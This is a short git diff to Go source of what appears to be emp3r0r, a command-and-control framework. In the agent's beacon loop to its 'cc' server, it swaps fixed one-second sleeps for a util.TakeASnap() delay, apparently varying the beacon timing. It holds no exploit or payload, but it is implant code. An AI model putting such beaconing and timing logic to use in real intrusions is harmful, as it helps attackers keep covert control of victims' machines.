@@ -20,6 +20,7 @@ import (
 	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -162,7 +163,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			err = out.Encode(msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
-				time.Sleep(1 * time.Second)
+				util.TakeASnap()
 				continue
 			}
 			return true
@@ -172,7 +173,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// send hello every second
 	for ctx.Err() == nil {
-		time.Sleep(1 * time.Second)
+		util.TakeASnap()
 		if !sendHello(10) {
 			log.Print("sendHello failed after 10 tries")
 			break
